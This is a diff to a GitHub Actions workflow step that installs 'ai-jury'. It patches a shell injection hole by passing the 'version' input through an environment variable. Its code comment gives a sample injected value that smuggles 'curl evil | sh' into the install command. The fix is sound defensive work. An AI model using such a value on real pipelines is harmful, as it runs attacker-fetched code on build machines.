@@ -41,9 +41,16 @@ runs:
 
     - name: Install ai-jury
       shell: bash
+      # `version` goes through the environment like every other caller-supplied
+      # input. A `${{ }}` expression is substituted textually before bash parses
+      # the line, so a value carrying a quote and a `;` becomes shell code —
+      # `version: '1.0"; curl evil | sh; "'` would execute. #584 moved the other
+      # four inputs out for exactly this reason and left this one behind.
+      env:
+        INPUT_VERSION: ${{ inputs.version }}
       run: |
-        if [ -n "${{ inputs.version }}" ]; then
-          python -m pip install "ai-jury==${{ inputs.version }}"
+        if [ -n "$INPUT_VERSION" ]; then
+          python -m pip install "ai-jury==$INPUT_VERSION"
         else
           python -m pip install ai-jury
         fi
